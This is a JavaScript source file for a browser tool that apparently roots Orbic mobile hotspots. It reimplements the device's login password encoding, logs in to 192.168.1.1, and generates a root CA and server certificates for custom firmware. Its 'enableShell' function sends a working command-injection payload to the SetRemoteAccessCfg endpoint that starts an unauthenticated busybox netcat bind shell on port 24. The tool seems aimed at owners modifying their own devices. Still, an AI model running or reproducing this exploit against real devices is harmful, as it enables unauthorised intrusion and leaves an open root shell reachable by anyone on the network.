/**
 * DagShell Orbic Flasher - Browser-based shell enabler
 * Ports enable_shell.py logic to JavaScript
 */

// ==================== Logging Utilities ====================

function logMessage(logId, message, type = 'info') {
    const logEl = document.getElementById(logId);
    if (!logEl) return;

    logEl.style.display = 'block';
    const span = document.createElement('span');
    span.className = `log-${type}`;
    span.textContent = `[${new Date().toLocaleTimeString()}] ${message}\n`;
    logEl.appendChild(span);
    logEl.scrollTop = logEl.scrollHeight;
}

function clearLog(logId) {
    const logEl = document.getElementById(logId);
    if (logEl) {
        logEl.innerHTML = '';
        logEl.style.display = 'none';
    }
}

function markStepComplete(stepId) {
    document.getElementById(stepId)?.classList.add('completed');
}

function setButtonLoading(btnId, loading) {
    const btn = document.getElementById(btnId);
    if (btn) {
        btn.disabled = loading;
        btn.classList.toggle('loading', loading);
    }
}

// ==================== MD5 Implementation ====================
// Lightweight MD5 for password hashing (required by Orbic API)

const MD5 = (function () {
    function safeAdd(x, y) {
        const lsw = (x & 0xffff) + (y & 0xffff);
        const msw = (x >> 16) + (y >> 16) + (lsw >> 16);
        return (msw << 16) | (lsw & 0xffff);
    }

    function bitRotateLeft(num, cnt) {
        return (num << cnt) | (num >>> (32 - cnt));
    }

    function md5cmn(q, a, b, x, s, t) {
        return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b);
    }

    function md5ff(a, b, c, d, x, s, t) {
        return md5cmn((b & c) | (~b & d), a, b, x, s, t);
    }

    function md5gg(a, b, c, d, x, s, t) {
        return md5cmn((b & d) | (c & ~d), a, b, x, s, t);
    }

    function md5hh(a, b, c, d, x, s, t) {
        return md5cmn(b ^ c ^ d, a, b, x, s, t);
    }

    function md5ii(a, b, c, d, x, s, t) {
        return md5cmn(c ^ (b | ~d), a, b, x, s, t);
    }

    function binlMD5(x, len) {
        x[len >> 5] |= 0x80 << len % 32;
        x[(((len + 64) >>> 9) << 4) + 14] = len;

        let a = 1732584193, b = -271733879, c = -1732584194, d = 271733878;

        for (let i = 0; i < x.length; i += 16) {
            const olda = a, oldb = b, oldc = c, oldd = d;

            a = md5ff(a, b, c, d, x[i], 7, -680876936);
            d = md5ff(d, a, b, c, x[i + 1], 12, -389564586);
            c = md5ff(c, d, a, b, x[i + 2], 17, 606105819);
            b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330);
            a = md5ff(a, b, c, d, x[i + 4], 7, -176418897);
            d = md5ff(d, a, b, c, x[i + 5], 12, 1200080426);
            c = md5ff(c, d, a, b, x[i + 6], 17, -1473231341);
            b = md5ff(b, c, d, a, x[i + 7], 22, -45705983);
            a = md5ff(a, b, c, d, x[i + 8], 7, 1770035416);
            d = md5ff(d, a, b, c, x[i + 9], 12, -1958414417);
            c = md5ff(c, d, a, b, x[i + 10], 17, -42063);
            b = md5ff(b, c, d, a, x[i + 11], 22, -1990404162);
            a = md5ff(a, b, c, d, x[i + 12], 7, 1804603682);
            d = md5ff(d, a, b, c, x[i + 13], 12, -40341101);
            c = md5ff(c, d, a, b, x[i + 14], 17, -1502002290);
            b = md5ff(b, c, d, a, x[i + 15], 22, 1236535329);

            a = md5gg(a, b, c, d, x[i + 1], 5, -165796510);
            d = md5gg(d, a, b, c, x[i + 6], 9, -1069501632);
            c = md5gg(c, d, a, b, x[i + 11], 14, 643717713);
            b = md5gg(b, c, d, a, x[i], 20, -373897302);
            a = md5gg(a, b, c, d, x[i + 5], 5, -701558691);
            d = md5gg(d, a, b, c, x[i + 10], 9, 38016083);
            c = md5gg(c, d, a, b, x[i + 15], 14, -660478335);
            b = md5gg(b, c, d, a, x[i + 4], 20, -405537848);
            a = md5gg(a, b, c, d, x[i + 9], 5, 568446438);
            d = md5gg(d, a, b, c, x[i + 14], 9, -1019803690);
            c = md5gg(c, d, a, b, x[i + 3], 14, -187363961);
            b = md5gg(b, c, d, a, x[i + 8], 20, 1163531501);
            a = md5gg(a, b, c, d, x[i + 13], 5, -1444681467);
            d = md5gg(d, a, b, c, x[i + 2], 9, -51403784);
            c = md5gg(c, d, a, b, x[i + 7], 14, 1735328473);
            b = md5gg(b, c, d, a, x[i + 12], 20, -1926607734);

            a = md5hh(a, b, c, d, x[i + 5], 4, -378558);
            d = md5hh(d, a, b, c, x[i + 8], 11, -2022574463);
            c = md5hh(c, d, a, b, x[i + 11], 16, 1839030562);
            b = md5hh(b, c, d, a, x[i + 14], 23, -35309556);
            a = md5hh(a, b, c, d, x[i + 1], 4, -1530992060);
            d = md5hh(d, a, b, c, x[i + 4], 11, 1272893353);
            c = md5hh(c, d, a, b, x[i + 7], 16, -155497632);
            b = md5hh(b, c, d, a, x[i + 10], 23, -1094730640);
            a = md5hh(a, b, c, d, x[i + 13], 4, 681279174);
            d = md5hh(d, a, b, c, x[i + 0], 11, -358537222);
            c = md5hh(c, d, a, b, x[i + 3], 16, -722521979);
            b = md5hh(b, c, d, a, x[i + 6], 23, 76029189);
            a = md5hh(a, b, c, d, x[i + 9], 4, -640364487);
            d = md5hh(d, a, b, c, x[i + 12], 11, -421815835);
            c = md5hh(c, d, a, b, x[i + 15], 16, 530742520);
            b = md5hh(b, c, d, a, x[i + 2], 23, -995338651);

            a = md5ii(a, b, c, d, x[i], 6, -198630844);
            d = md5ii(d, a, b, c, x[i + 7], 10, 1126891415);
            c = md5ii(c, d, a, b, x[i + 14], 15, -1416354905);
            b = md5ii(b, c, d, a, x[i + 5], 21, -57434055);
            a = md5ii(a, b, c, d, x[i + 12], 6, 1700485571);
            d = md5ii(d, a, b, c, x[i + 3], 10, -1894986606);
            c = md5ii(c, d, a, b, x[i + 10], 15, -1051523);
            b = md5ii(b, c, d, a, x[i + 1], 21, -2054922799);
            a = md5ii(a, b, c, d, x[i + 8], 6, 1873313359);
            d = md5ii(d, a, b, c, x[i + 15], 10, -30611744);
            c = md5ii(c, d, a, b, x[i + 6], 15, -1560198380);
            b = md5ii(b, c, d, a, x[i + 13], 21, 1309151649);
            a = md5ii(a, b, c, d, x[i + 4], 6, -145523070);
            d = md5ii(d, a, b, c, x[i + 11], 10, -1120210379);
            c = md5ii(c, d, a, b, x[i + 2], 15, 718787259);
            b = md5ii(b, c, d, a, x[i + 9], 21, -343485551);

            a = safeAdd(a, olda);
            b = safeAdd(b, oldb);
            c = safeAdd(c, oldc);
            d = safeAdd(d, oldd);
        }
        return [a, b, c, d];
    }

    function binl2hex(binarray) {
        const hexTab = '0123456789abcdef';
        let str = '';
        for (let i = 0; i < binarray.length * 4; i++) {
            str += hexTab.charAt((binarray[i >> 2] >> ((i % 4) * 8 + 4)) & 0xf) +
                hexTab.charAt((binarray[i >> 2] >> ((i % 4) * 8)) & 0xf);
        }
        return str;
    }

    function str2binl(str) {
        const bin = [];
        for (let i = 0; i < str.length * 8; i += 8) {
            bin[i >> 5] |= (str.charCodeAt(i / 8) & 0xff) << i % 32;
        }
        return bin;
    }

    return function (str) {
        return binl2hex(binlMD5(str2binl(str), str.length * 8));
    };
})();

// ==================== Orbic Password Encoding ====================

function swapChars(str, pos1, pos2) {
    if (pos1 >= str.length || pos2 >= str.length) return str;
    const chars = str.split('');
    [chars[pos1], chars[pos2]] = [chars[pos2], chars[pos1]];
    return chars.join('');
}

function applySecretSwapping(text, secretNum) {
    for (let i = 0; i < 4; i++) {
        const byte = (secretNum >> (i * 8)) & 0xff;
        const pos1 = byte % text.length;
        const pos2 = i % text.length;
        text = swapChars(text, pos1, pos2);
    }
    return text;
}

function encodePassword(password, secret, timestamp, timestampStart) {
    const currentTime = Math.floor(Date.now() / 1000);

    // MD5 hash the password and use fixed prefix "a7"
    const passwordMd5 = MD5(password);
    let splicedPassword = `a7${passwordMd5}`;

    // Parse secret as hex and apply swapping
    const secretNum = parseInt(secret, 16);
    splicedPassword = applySecretSwapping(splicedPassword, secretNum);

    // Calculate time delta
    const timestampHex = parseInt(timestamp, 16);
    const timeDelta = (timestampHex + (currentTime - timestampStart)).toString(16);

    // Format message with fixed "6137" prefix
    const message = `6137x${timeDelta}:${splicedPassword}`;

    // Base64 encode
    let result = btoa(message);

    // Apply swapping again
    result = applySecretSwapping(result, secretNum);

    return result;
}

// ==================== Shell Enable (HTTP Exploit) ====================

async function enableShell() {
    const passwordInput = document.getElementById('admin-password');
    const password = passwordInput?.value?.trim();

    if (!password) {
        alert('Please enter your admin password');
        return;
    }

    const logId = 'log-shell';
    const btnId = 'btn-enable-shell';

    clearLog(logId);
    setButtonLoading(btnId, true);

    const targetIp = '192.168.1.1';

    try {
        // Step 1: Get login info
        logMessage(logId, '[1/4] Getting login info...', 'info');
        const timestampStart = Math.floor(Date.now() / 1000);

        let loginInfoResp;
        try {
            loginInfoResp = await fetch(`http://${targetIp}/goform/GetLoginInfo`, {
                method: 'GET',
                mode: 'cors',
            });
        } catch (e) {
            logMessage(logId, `ERROR: Cannot connect to ${targetIp}. Are you connected to the Orbic WiFi?`, 'error');
            logMessage(logId, 'Make sure you are connected to the Orbic hotspot network.', 'warning');
            setButtonLoading(btnId, false);
            return;
        }

        if (!loginInfoResp.ok) {
            logMessage(logId, `ERROR: GetLoginInfo returned ${loginInfoResp.status}`, 'error');
            setButtonLoading(btnId, false);
            return;
        }

        const loginInfo = await loginInfoResp.json();
        logMessage(logId, `  Response: ${JSON.stringify(loginInfo)}`, 'info');

        if (loginInfo.retcode !== 0) {
            logMessage(logId, `ERROR: retcode = ${loginInfo.retcode}`, 'error');
            setButtonLoading(btnId, false);
            return;
        }

        const priKey = loginInfo.priKey || '';
        const parts = priKey.split('x');
        if (parts.length !== 2) {
            logMessage(logId, `ERROR: Invalid priKey format: ${priKey}`, 'error');
            setButtonLoading(btnId, false);
            return;
        }

        const secret = parts[0];
        const timestamp = parts[1];
        logMessage(logId, `  Secret: ${secret}, Timestamp: ${timestamp}`, 'success');

        // Step 2: Encode credentials
        logMessage(logId, '[2/4] Encoding credentials...', 'info');
        const usernameMd5 = MD5('admin');
        const encodedPassword = encodePassword(password, secret, timestamp, timestampStart);
        logMessage(logId, `  Username MD5: ${usernameMd5}`, 'info');
        logMessage(logId, `  Encoded password: ${encodedPassword.substring(0, 20)}...`, 'info');

        // Step 3: Login
        logMessage(logId, '[3/4] Logging in...', 'info');
        const loginResp = await fetch(`http://${targetIp}/goform/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: usernameMd5,
                password: encodedPassword
            }),
            mode: 'cors',
        });

        logMessage(logId, `  Status: ${loginResp.status}`, 'info');

        try {
            const loginResult = await loginResp.json();
            logMessage(logId, `  Response: ${JSON.stringify(loginResult)}`, 'info');
            if (loginResult.retcode !== 0) {
                logMessage(logId, `WARNING: Login retcode = ${loginResult.retcode}`, 'warning');
                logMessage(logId, 'This might mean wrong password. Check the device label.', 'warning');
            }
        } catch (e) {
            const text = await loginResp.text();
            logMessage(logId, `  Response: ${text.substring(0, 200)}`, 'info');
        }

        // Step 4: Exploit - inject command to start nc shell
        logMessage(logId, '[4/4] Exploiting SetRemoteAccessCfg...', 'info');
        const exploitPayload = '{"password": "\\"; busybox nc -ll -p 24 -e /bin/sh & #"}';

        const exploitResp = await fetch(`http://${targetIp}/action/SetRemoteAccessCfg`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: exploitPayload,
            mode: 'cors',
        });

        logMessage(logId, `  Status: ${exploitResp.status}`, 'info');

        try {
            const result = await exploitResp.json();
            logMessage(logId, `  Response: ${JSON.stringify(result)}`, 'info');
            if (result.retcode === 0) {
                logMessage(logId, '  ✓ Exploit sent successfully!', 'success');
            }
        } catch (e) {
            const text = await exploitResp.text();
            logMessage(logId, `  Response: ${text.substring(0, 200)}`, 'info');
        }

        // Wait and notify
        logMessage(logId, '', 'info');
        logMessage(logId, '='.repeat(50), 'success');
        logMessage(logId, 'SHELL SHOULD BE ENABLED!', 'success');
        logMessage(logId, 'Port 24 should now be open on the device.', 'success');
        logMessage(logId, 'Proceed to Step 4 to deploy the firmware.', 'success');
        logMessage(logId, '='.repeat(50), 'success');

        markStepComplete('step3');

    } catch (error) {
        logMessage(logId, `ERROR: ${error.message}`, 'error');
        logMessage(logId, 'If you see CORS errors, you need to be connected to the Orbic WiFi.', 'warning');
    }

    setButtonLoading(btnId, false);
}

// ==================== PKI Generation ====================

function downloadFile(filename, data) {
    const blob = new Blob([data], { type: 'application/octet-stream' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function pemToDer(pem) {
    // Remove PEM headers and decode base64
    const base64 = pem
        .replace(/-----BEGIN [A-Z ]+-----/g, '')
        .replace(/-----END [A-Z ]+-----/g, '')
        .replace(/\s+/g, '');
    const binary = atob(base64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
    }
    return bytes;
}

async function generatePKI() {
    const logId = 'log-pki';
    const btnId = 'btn-generate-pki';

    clearLog(logId);
    setButtonLoading(btnId, true);

    try {
        // Check if Forge is loaded
        if (typeof forge === 'undefined') {
            logMessage(logId, 'ERROR: Forge.js not loaded. Check internet connection.', 'error');
            setButtonLoading(btnId, false);
            return;
        }

        logMessage(logId, 'Generating PKI certificates using Forge.js...', 'info');

        // ===== 1. Generate Root CA =====
        logMessage(logId, '[1/4] Generating Root CA key pair (2048-bit RSA)...', 'info');
        const rootKeys = forge.pki.rsa.generateKeyPair(2048);
        logMessage(logId, '  ✓ Root CA key pair generated', 'success');

        logMessage(logId, '[2/4] Creating Root CA certificate...', 'info');
        const rootCert = forge.pki.createCertificate();
        rootCert.publicKey = rootKeys.publicKey;
        rootCert.serialNumber = '01';
        rootCert.validity.notBefore = new Date();
        rootCert.validity.notAfter = new Date();
        rootCert.validity.notAfter.setFullYear(rootCert.validity.notBefore.getFullYear() + 10);

        const rootAttrs = [
            { name: 'commonName', value: 'DagShell Root CA' },
            { name: 'organizationName', value: 'DagShell' }
        ];
        rootCert.setSubject(rootAttrs);
        rootCert.setIssuer(rootAttrs); // Self-signed

        rootCert.setExtensions([
            { name: 'basicConstraints', cA: true, critical: true },
            { name: 'keyUsage', keyCertSign: true, cRLSign: true, digitalSignature: true, critical: true }
        ]);

        rootCert.sign(rootKeys.privateKey, forge.md.sha256.create());
        logMessage(logId, '  ✓ Root CA certificate created', 'success');

        // ===== 2. Generate Server Certificate =====
        logMessage(logId, '[3/4] Generating Server key pair and certificate...', 'info');
        const serverKeys = forge.pki.rsa.generateKeyPair(2048);

        const serverCert = forge.pki.createCertificate();
        serverCert.publicKey = serverKeys.publicKey;
        serverCert.serialNumber = '02';
        serverCert.validity.notBefore = new Date();
        serverCert.validity.notAfter = new Date();
        serverCert.validity.notAfter.setFullYear(serverCert.validity.notBefore.getFullYear() + 1);

        const serverAttrs = [
            { name: 'commonName', value: '192.168.1.1' },
            { name: 'organizationName', value: 'DagShell' }
        ];
        serverCert.setSubject(serverAttrs);
        serverCert.setIssuer(rootAttrs); // Signed by Root CA

        serverCert.setExtensions([
            { name: 'basicConstraints', cA: false, critical: true },
            { name: 'keyUsage', digitalSignature: true, keyEncipherment: true },
            { name: 'extKeyUsage', serverAuth: true },
            {
                name: 'subjectAltName',
                altNames: [
                    { type: 7, ip: '192.168.1.1' },  // IP address
                    { type: 2, value: 'localhost' }   // DNS name
                ]
            }
        ]);

        serverCert.sign(rootKeys.privateKey, forge.md.sha256.create());
        logMessage(logId, '  ✓ Server certificate created (signed by Root CA)', 'success');

        // ===== 3. Export to DER =====
        logMessage(logId, '[4/4] Exporting certificates to DER format...', 'info');

        // Convert to PEM first, then to DER
        const rootCertPem = forge.pki.certificateToPem(rootCert);
        const serverCertPem = forge.pki.certificateToPem(serverCert);
        const serverKeyPem = forge.pki.privateKeyToPem(serverKeys.privateKey);

        const rootDer = pemToDer(rootCertPem);
        const serverDer = pemToDer(serverCertPem);
        const serverKeyDer = pemToDer(serverKeyPem);

        logMessage(logId, '  ✓ root.der (' + rootDer.length + ' bytes)', 'success');
        logMessage(logId, '  ✓ server.der (' + serverDer.length + ' bytes)', 'success');
        logMessage(logId, '  ✓ server.key.der (' + serverKeyDer.length + ' bytes)', 'success');

        // ===== 4. Download files =====
        logMessage(logId, '', 'info');
        logMessage(logId, 'Downloading certificate files...', 'info');

        downloadFile('root.der', rootDer);
        await new Promise(r => setTimeout(r, 500)); // Small delay between downloads
        downloadFile('server.der', serverDer);
        await new Promise(r => setTimeout(r, 500));
        downloadFile('server.key.der', serverKeyDer);

        logMessage(logId, '', 'success');
        logMessage(logId, '='.repeat(50), 'success');
        logMessage(logId, 'PKI GENERATION COMPLETE!', 'success');
        logMessage(logId, 'Files downloaded: root.der, server.der, server.key.der', 'success');
        logMessage(logId, 'Place these files in orbic_fw_c/ before deploying.', 'success');
        logMessage(logId, '='.repeat(50), 'success');

        markStepComplete('step1');

    } catch (error) {
        logMessage(logId, `ERROR: ${error.message}`, 'error');
        console.error('PKI generation error:', error);
        logMessage(logId, 'Try running gen_pki.py instead: python orbic_fw_c/gen_pki.py', 'warning');
    }

    setButtonLoading(btnId, false);
}

// ==================== Utility Functions ====================

function copyCommand(btn) {
    const commandBox = btn.parentElement;
    const code = commandBox.querySelector('code').textContent;

    navigator.clipboard.writeText(code).then(() => {
        const originalText = btn.textContent;
        btn.textContent = 'Copied!';
        btn.style.background = 'var(--cyan)';
        btn.style.color = '#000';

        setTimeout(() => {
            btn.textContent = originalText;
            btn.style.background = '';
            btn.style.color = '';
        }, 2000);
    }).catch(err => {
        console.error('Failed to copy:', err);
        // Fallback: select text
        const range = document.createRange();
        range.selectNode(commandBox.querySelector('code'));
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(range);
    });
}
